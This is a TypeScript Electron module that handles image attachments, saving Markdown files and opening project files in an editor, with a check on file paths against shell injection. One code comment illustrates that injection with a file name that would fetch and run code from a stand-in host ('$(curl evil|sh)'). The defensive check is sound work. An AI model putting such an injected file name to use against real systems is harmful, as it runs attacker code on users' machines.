import { spawn } from 'node:child_process';
import { readFileSync, statSync, writeFileSync } from 'node:fs';
import { basename, extname } from 'node:path';
import { dialog, type BrowserWindow } from 'electron';
import type { ImageAttachment } from '@shared/ipc';
import { Workspace } from './tools/workspace';

const IMAGE_TYPES: Record<string, ImageAttachment['mediaType']> = {
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.webp': 'image/webp',
};

// The API limit for a single image is 5 MB; larger files are rejected here with a clear message.
const MAX_IMAGE_BYTES = 5 * 1024 * 1024;

export async function pickImages(window: BrowserWindow | null): Promise<ImageAttachment[]> {
  const options = {
    properties: ['openFile', 'multiSelections'] as Array<'openFile' | 'multiSelections'>,
    filters: [{ name: 'Images', extensions: ['png', 'jpg', 'jpeg', 'gif', 'webp'] }],
  };
  const result = window ? await dialog.showOpenDialog(window, options) : await dialog.showOpenDialog(options);
  if (result.canceled) return [];

  return result.filePaths.map((path) => {
    const mediaType = IMAGE_TYPES[extname(path).toLowerCase()];
    if (!mediaType) throw new Error(`Unsupported image type: ${basename(path)}`);
    if (statSync(path).size > MAX_IMAGE_BYTES) throw new Error(`${basename(path)} is larger than 5 MB.`);
    return { name: basename(path), mediaType, base64: readFileSync(path).toString('base64') };
  });
}

// Asks where to save a text file and writes it. Returns the chosen path, or null when the user cancels.
export async function saveTextFile(
  window: BrowserWindow | null,
  defaultName: string,
  text: string,
): Promise<string | null> {
  const options = { defaultPath: defaultName, filters: [{ name: 'Markdown', extensions: ['md'] }] };
  const result = window ? await dialog.showSaveDialog(window, options) : await dialog.showSaveDialog(options);
  if (result.canceled || !result.filePath) return null;
  writeFileSync(result.filePath, text, 'utf8');
  return result.filePath;
}

// Opens a project file with the user's editor command (e.g. "code"). The path must be inside the project, and is
// passed as a single quoted argument.
export function openInEditor(editorCommand: string, projectRoot: string, path: string): void {
  const file = new Workspace(projectRoot).resolve(path);
  // The path is a single double-quoted argument. On macOS and Linux the shell still expands `$(...)`, `$VAR` and
  // backticks inside double quotes (a file named "$(curl evil|sh).js" would run it), and a backslash could end the
  // quotes; cmd.exe on Windows only expands %VAR% there, which runs nothing.
  const unsafe = process.platform === 'win32' ? /["\r\n]/ : /["\r\n$`\\]/;
  if (unsafe.test(file)) throw new Error('Unsupported characters in file path.');
  const command = editorCommand.trim() || 'code';
  const child = spawn(`${command} "${file}"`, { shell: true, detached: true, stdio: 'ignore', windowsHide: true });
  child.on('error', () => {});
  child.unref();
}
